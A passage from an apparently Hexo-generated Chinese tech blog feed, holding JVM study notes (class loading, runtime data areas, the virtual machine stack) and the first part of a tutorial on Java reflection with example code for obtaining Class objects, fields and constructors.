    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>岁月悠悠，衰微只及肌肤；热忱抛却，颓唐必致灵魂</p>
</blockquote>
<p>今天来总结一下JVM。</p>
<a id="more"></a>

<h1 id="JVM的整体结构"><a href="#JVM的整体结构" class="headerlink" title="JVM的整体结构"></a>JVM的整体结构</h1><p>JDK：JVM + 基础类库 + 编译工具；</p>
<p>JRE：JVM + 基础类库；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418145902839.png" alt="image-20200418145902839"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155204290.png" alt="image-20200418155204290"></p>
<p>说明：</p>
<ol>
<li>线程私有：虚拟机栈，本地方法栈，程序计数器；</li>
<li>线程共享：堆，方法区；</li>
<li>执行引擎：解释器（Interpreter）、JIT（即时编译器，编译器后端）、GC（垃圾回收器）；</li>
<li>JVM直接和操作系统对话；</li>
<li>先经过类加载器，类信息放在方法区中，类的实例对象放在堆中；</li>
<li>解释器逐行解释代码，翻译成机器码；</li>
</ol>
<h1 id="Java代码执行流程"><a href="#Java代码执行流程" class="headerlink" title="Java代码执行流程"></a>Java代码执行流程</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151219263.png" alt="image-20200418151219263"></p>
<h1 id="JVM的架构模型"><a href="#JVM的架构模型" class="headerlink" title="JVM的架构模型"></a>JVM的架构模型</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151623527.png" alt="image-20200418151623527"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418151703860.png" alt="image-20200418151703860"></p>
<h1 id="JVM的生命周期"><a href="#JVM的生命周期" class="headerlink" title="JVM的生命周期"></a>JVM的生命周期</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418154808045.png" alt="image-20200418154808045"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155021200.png" alt="image-20200418155021200"></p>
<p>说明：</p>
<ol>
<li><code>jps</code>查看JVM进程</li>
</ol>
<h1 id="类加载子系统"><a href="#类加载子系统" class="headerlink" title="类加载子系统"></a>类加载子系统</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155255836.png" alt="image-20200418155255836"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155548287.png" alt="image-20200418155548287"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155604895.png" alt="image-20200418155604895"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418155641028.png" alt="image-20200418155641028"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160000057.png" alt="image-20200418160000057"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160516538.png" alt="image-20200418160516538"></p>
<ol>
<li><p>加载：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418160817268.png" alt="image-20200418160817268"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161024792.png" alt="image-20200418161024792"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419153054534.png" alt="image-20200419153054534"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419153129167.png" alt="image-20200419153129167"></p>
<p>讲图：</p>
<p>instanceKlass相当于一种数据结构；</p>
<p>堆中存放Person.class的类对象，这个类对象有instanceKlass的内存地址</p>
<p>instanceKlass也存放着Person类对象的内存地址；</p>
</li>
</ol>
<p>   对于Person的实例化对象来说，对象头部存放Person类对象地址；</p>
<p>   那么就会先去找class类对象，再间接去元空间去找instanceKlass对象，再之后就会去元空间里面找<code>_Methods,_fields</code>，去调用对象方法。</p>
<ol start="2">
<li><p>链接：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161125751.png" alt="image-20200418161125751"></p>
<p>验证：</p>
<ol>
<li><p>文件格式验证：0xCAFEBABE</p>
</li>
<li><p>元数据验证：对字节码描述的信息进行语义分析</p>
</li>
<li><p>字节码验证：最复杂</p>
<p>通过数据流分析和控制流分析，确定程序是合法的，符合逻辑的</p>
</li>
<li><p>符号饮用验证：确保解析行为可以正常运行</p>
</li>
</ol>
<p>准备：</p>
<ol>
<li>对于final，static：<ol>
<li>基本类型会直接给值</li>
<li>包装类就会先0再赋值</li>
</ol>
</li>
<li>在JDK7之后，静态变量的内存不再方法区内，会跟着类对象存储在堆中。</li>
<li>常量也会在准备阶段被赋值；</li>
</ol>
<p>解析：其实就是<code>#1-&gt;内存指针</code>的过程；</p>
</li>
<li><p>初始化：</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418161953621.png" alt="image-20200418161953621"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418162523130.png" alt="image-20200418162523130"></p>
<p>讲图：</p>
<p><clinit>（）就是给类变量赋值；</clinit></p>
<p>类一旦被初始化，那么static{}代码块就会执行；</p>
</li>
</ol>
<h2 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418163927620.png" alt="image-20200418163927620"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418164007063.png" alt="image-20200418164007063"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165041003.png" alt="image-20200418165041003"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165056893.png" alt="image-20200418165056893"></p>
<h3 id="启动类加载器"><a href="#启动类加载器" class="headerlink" title="启动类加载器"></a>启动类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418165134118.png" alt="image-20200418165134118"></p>
<h3 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170248971.png" alt="image-20200418170248971"></p>
<h3 id="应用程序类加载器"><a href="#应用程序类加载器" class="headerlink" title="应用程序类加载器"></a>应用程序类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170341262.png" alt="image-20200418170341262"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170745232.png" alt="image-20200418170745232"></p>
<h3 id="用户自定义类加载器"><a href="#用户自定义类加载器" class="headerlink" title="用户自定义类加载器"></a>用户自定义类加载器</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418170831894.png" alt="image-20200418170831894"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171054380.png" alt="image-20200418171054380"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171316057.png" alt="image-20200418171316057"></p>
<h2 id="关于ClassLoader"><a href="#关于ClassLoader" class="headerlink" title="关于ClassLoader"></a>关于ClassLoader</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418171426186.png" alt="image-20200418171426186"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418172845950.png" alt="image-20200418172845950"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173249965.png" alt="image-20200418173249965"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173527886.png" alt></p>
<h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418173924676.png" alt="image-20200418173924676"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418174739320.png" alt="image-20200418174739320"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418180901719.png" alt="image-20200418180901719"></p>
<h2 id="沙箱安全机制"><a href="#沙箱安全机制" class="headerlink" title="沙箱安全机制"></a>沙箱安全机制</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418180935740.png" alt="image-20200418180935740"></p>
<h2 id="类的主动使用和被动使用"><a href="#类的主动使用和被动使用" class="headerlink" title="类的主动使用和被动使用"></a>类的主动使用和被动使用</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418181420103.png" alt="image-20200418181420103"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185356560.png" alt="image-20200418185356560"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185453190.png" alt="image-20200418185453190"></p>
<h1 id="运行时数据区"><a href="#运行时数据区" class="headerlink" title="运行时数据区"></a>运行时数据区</h1><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418185723067.png" alt="image-20200418185723067"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418192817976.png" alt="image-20200418192817976"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418193138847.png" alt="image-20200418193138847"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418194740732.png" alt="image-20200418194740732"></p>
<h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195102631.png" alt="image-20200418195102631"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195246131.png" alt="image-20200418195246131"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195504014.png" alt="image-20200418195504014"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418195628415.png" alt="image-20200418195628415"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200332016.png" alt="image-20200418200332016"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200413151.png" alt="image-20200418200413151"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418200450509.png" alt="image-20200418200450509"></p>
<p>说明：</p>
<p>并行是时刻，并发是时间段；</p>
<p>并行是同时执行，并发是一个时间片内交替执行；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418203821322.png" alt="image-20200418203821322"></p>
<h2 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418203923749.png" alt="image-20200418203923749"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418204014794.png" alt="image-20200418204014794"></p>
<p>说明：</p>
<p>栈空间也可以存放堆中对象的引用值；</p>
<p>栈：每个【线程】运行时需要的内存空间，每个线程只能有一个活动栈桢；</p>
<p>栈桢：每个【方法】运行时需要的内存空间：</p>
<p>​            局部变量表/操作数栈/动态链接/返回地址</p>
<p>活动栈桢：对应着当前正在执行的方法，往往在栈顶部；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205038016.png" alt="image-20200418205038016"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205108066.png" alt="image-20200418205108066"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205237524.png" alt="image-20200418205237524"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205309508.png" alt="image-20200418205309508"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205413293.png" alt="image-20200418205413293"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205716022.png" alt="image-20200418205716022"></p>
<h3 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418205949373.png" alt="image-20200418205949373"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418210220163.png" alt="image-20200418210220163"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418210905110.png" alt="image-20200418210905110"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418211004395.png" alt="image-20200418211004395"></p>
<p>说明：静态方法是不允许使用this关键字的</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418211757994.png" alt="image-20200418211757994"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212132545.png" alt="image-20200418212132545"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212227111.png" alt="image-20200418212227111"></p>
<h3 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h3><p>它是由数组实现的</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212650692.png" alt="image-20200418212650692"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418212759619.png" alt="image-20200418212759619"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213405170.png" alt="image-20200418213405170"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213538778.png" alt="image-20200418213538778"></p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213646147.png" alt="image-20200418213646147"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418213849929.png" alt="image-20200418213849929"></p>
<h3 id="栈顶缓存技术"><a href="#栈顶缓存技术" class="headerlink" title="栈顶缓存技术"></a>栈顶缓存技术</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418214034973.png" alt="image-20200418214034973"></p>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200418214152093.png" alt="image-20200418214152093"></p>
<p>运行时常量池在方法区中；</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419130449081.png" alt="image-20200419130449081"></p>
<h3 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419130630076.png" alt="image-20200419130630076"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419132125397.png" alt="image-20200419132125397"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419132917680.png" alt="image-20200419132917680"></p>
<h3 id="虚方法和非虚方法"><a href="#虚方法和非虚方法" class="headerlink" title="虚方法和非虚方法"></a>虚方法和非虚方法</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419133028099.png" alt="image-20200419133028099"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419134117873.png" alt="image-20200419134117873"></p>
<p>this/super基本上都是非虚方法，在编译期间就可以确定</p>
<p>invokestatic/invokespecial</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419140113762.png" alt="image-20200419140113762"></p>
<p>如果隐式调用父类的final方法（也就是不加super.），是invokevirtual</p>
<p>但如果super.的方式，则是invokespecial</p>
<p>子类重写也是invokevirtual</p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419150151752.png" alt="image-20200419150151752"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419150436945.png" alt="image-20200419150436945"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151113451.png" alt="image-20200419151113451"></p>
<h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151335851.png" alt="image-20200419151335851"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151451292.png" alt="image-20200419151451292"></p>
<h3 id="方法返回地址"><a href="#方法返回地址" class="headerlink" title="方法返回地址"></a>方法返回地址</h3><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419151808852.png" alt="image-20200419151808852"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152042892.png" alt="image-20200419152042892"></p>
<h2 id="本地方法接口"><a href="#本地方法接口" class="headerlink" title="本地方法接口"></a>本地方法接口</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152319866.png" alt="image-20200419152319866"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152355798.png" alt="image-20200419152355798"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152450717.png" alt="image-20200419152450717"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152549409.png" alt="image-20200419152549409"></p>
<h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152635383.png" alt="image-20200419152635383"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152713001.png" alt="image-20200419152713001"></p>
<p><img src="../images/JVM%E6%A2%B3%E7%90%86/image-20200419152747720.png" alt="image-20200419152747720"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>漫谈Java反射</title>
    <url>/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p> 看试手，补天裂。</p>
</blockquote>
<p>今天来总结一下Java反射，在它面前，任何事物没有任何隐私。</p>
<a id="more"></a>

<h1 id="什么是Java反射？"><a href="#什么是Java反射？" class="headerlink" title="什么是Java反射？"></a>什么是Java反射？</h1><blockquote>
<p>将类的各个组成部分封装为其他对象，这就是反射机制。</p>
</blockquote>
<p>Java中的反射机制是指<strong>在运行状态中</strong>，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p>
<p><strong><em>让Java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法。</em></strong></p>
<p>举个例子，Java代码在计算机中经历的三个阶段：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411205831842.png" alt="image-20200411205831842"></p>
<ul>
<li><p>source源代码阶段：此时刚刚编译为字节码，仍然保存在硬盘上。</p>
</li>
<li><p>Class类对象阶段：类加载器把Person.class字节码加载进内存。</p>
<p>对于java来说，万物皆对象，那么这时内存里会有一个Person这个类的类对象，也就是<strong>Class类对象</strong>，这个东西就很抽象。</p>
<blockquote>
<p>在Java里面有个类叫做<strong>Class</strong>，它是来描述<strong><em>所有字节码物理文件的一些共同特征和行为</em></strong>。例如成员变量，构造方法，普通的成员方法。</p>
<p>Class类对象会对重点内容进行封装成成员变量：</p>
<p>成员变量 ——-&gt; Field对象，Field[] fields</p>
<p>构造方法 ——-&gt; Constructor对象，Constructor[] cons</p>
<p>成员方法 ——-&gt; Method对象，Method[] methods</p>
</blockquote>
</li>
<li><p>运行时阶段：这个时候类对象已经实例化成为了一个对象</p>
</li>
</ul>
<p>好处：</p>
<ol>
<li>可以在程序<strong>运行过程中</strong>，操作对象。例如：获取，设置</li>
<li>可以降低程序耦合性，提高程序的扩展性</li>
</ol>
<h2 id="如何获取Class类对象？"><a href="#如何获取Class类对象？" class="headerlink" title="如何获取Class类对象？"></a>如何获取Class类对象？</h2><h3 id="字节码文件阶段"><a href="#字节码文件阶段" class="headerlink" title="字节码文件阶段"></a>字节码文件阶段</h3><blockquote>
<p>Class.forname(“全类名”)//包名.类名</p>
</blockquote>
<p>将字节码文件加载进内存 返回Class类对象</p>
<h3 id="内存阶段"><a href="#内存阶段" class="headerlink" title="内存阶段"></a>内存阶段</h3><blockquote>
<p>类名.class</p>
</blockquote>
<p>当class字节码加载进内存，那么这个Class类对象就有一个<strong>类名</strong>属性，可以用来索引</p>
<h3 id="运行时阶段"><a href="#运行时阶段" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><blockquote>
<p>对象.getClass()</p>
</blockquote>
<p>所有对象的父类都是Object类，这个类有自己的getClass方法，所有对象都可以拿来用</p>
<h3 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h3><p>类名.class 最安全 性能最好</p>
<p>Class.forName() 属于动态加载类。将字节码文件加载进内存，参数需要类的全限定名</p>
<p>使用类名.class来创建Class对象的引用时，不会自动初始化该Class对象</p>
<p>使用Class.forName()会自动初始化该Class对象</p>
<p>Class.forName() 方法 当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。</p>
<p>getDeclaredxxx 不能获取父类的方法</p>
<h2 id="实例demo"><a href="#实例demo" class="headerlink" title="实例demo"></a>实例demo</h2><h3 id="字节码阶段"><a href="#字节码阶段" class="headerlink" title="字节码阶段"></a>字节码阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Class.forName("全类名")</span></span><br><span class="line">Class cls1 = Class.forName(<span class="string">"domain.Person"</span>);</span><br><span class="line">System.out.println(cls1);</span><br></pre></td></tr></table></figure>

<h3 id="内存阶段-1"><a href="#内存阶段-1" class="headerlink" title="内存阶段"></a>内存阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类名.class属性</span></span><br><span class="line">Class cls2 = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">System.out.println(cls2);</span><br></pre></td></tr></table></figure>

<h3 id="运行时阶段-1"><a href="#运行时阶段-1" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对象.getClass()方法</span></span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Class cls3 = p.getClass();</span><br><span class="line">System.out.println(cls3);</span><br></pre></td></tr></table></figure>

<h3 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用==去比较三个class类对象，==比较的是对象的内存地址，如果内存地址相同，那么就是同一个对象</span></span><br><span class="line">System.out.println(cls1 == cls2);<span class="comment">//true</span></span><br><span class="line">System.out.println(cls1 == cls3);<span class="comment">//true</span></span><br><span class="line"><span class="comment">//结论：同一个字节码文件（xx.class）在一次程序运行的过程中，只会被加载一次</span></span><br><span class="line"><span class="comment">//不论是哪种方式获取的Class类对象，都是同一个。</span></span><br></pre></td></tr></table></figure>

<h1 id="实例对照"><a href="#实例对照" class="headerlink" title="实例对照"></a>实例对照</h1><p>下面看一个demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">  	<span class="comment">//public String a;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"eat..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">(String food)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"eat..."</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取Fields"><a href="#获取Fields" class="headerlink" title="获取Fields"></a>获取Fields</h2><blockquote>
<p> 获取成员变量们：</p>
<ul>
<li>Fields[] getFields()：只能获取所有public修饰的成员变量</li>
<li>Fields    getField(String name)：获取特定成员变量</li>
<li>Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符</li>
<li>Fields    getDeclaredField(String name)：获取特定的成员变量，【不考虑】修饰符</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//Fields[] getFields()：只会获取全部的【public修饰】的成员变量</span></span><br><span class="line">Field[] fields = personClass.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    <span class="comment">//由于都是private，什么都不输出</span></span><br><span class="line">    System.out.println(field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里新增测试字段 public a</span></span><br><span class="line"><span class="comment">//public String a;</span></span><br><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Field a = personClass.getField(<span class="string">"a"</span>);</span><br><span class="line"><span class="comment">//获取成员变量a的值</span></span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Object value = a.get(p);</span><br><span class="line">System.out.println(value);<span class="comment">//null</span></span><br><span class="line"><span class="comment">//设置a的值</span></span><br><span class="line">a.set(p,<span class="string">"张三"</span>)；</span><br><span class="line">System.out.println(p);<span class="comment">//Person&#123;name='null',age=0,a='张三'&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里新增测试字段private d</span></span><br><span class="line"><span class="comment">//private String d</span></span><br><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Field[] declaredFields = personClass.getDeclaredFields();</span><br><span class="line"><span class="comment">// 获取所有的成员变量，不考虑修饰符，这个方法超级暴力</span></span><br><span class="line"><span class="keyword">for</span> (Field declaredField : declaredFields) &#123;</span><br><span class="line">    <span class="comment">//由于都是private，什么都不输出</span></span><br><span class="line">    System.out.println(declaredField);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Field d = personClass.getDeclaredField(<span class="string">"d"</span>);</span><br><span class="line"><span class="comment">//当访问private时，忽略访问权限符的安全检查</span></span><br><span class="line"><span class="comment">//暴力反射</span></span><br><span class="line">d.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object value= d.get(p);</span><br><span class="line">System.out.println(value);<span class="comment">//null,因为初始化，还没有设置值</span></span><br></pre></td></tr></table></figure>

<h2 id="获取Constructor"><a href="#获取Constructor" class="headerlink" title="获取Constructor"></a>获取Constructor</h2><blockquote>
<p>获取构造方法们：</p>
<p>Constructor&lt;?&gt;[] getConstructors()</p>
<p>Constructor<?> getConstructor(类 <?> … parameterTypes)</p>
<p>Constructor&lt;?&gt; getDeclaredConstructors()</p>
<p>Constructor<?> getDeclaredConstructor(类 <?> … parameterTypes)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Constructor constructor = personClass.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;<span class="comment">//每一个构造方法的参数种类不一样，这一步是获取构造方法</span></span><br><span class="line">System.out.println(constructor);</span><br><span class="line"><span class="comment">//所以可以执行构造函数，进而创建对象，[构造器.newInstance]</span></span><br><span class="line">Object person = constructor.newInstance(<span class="string">"张三"</span>, <span class="number">23</span>);<span class="comment">//传递对应的参数值</span></span><br><span class="line">System.out.println(person);<span class="comment">//Person&#123;name=‘张三‘，age=’23‘&#125;</span></span><br></pre></td></tr></table></figure>

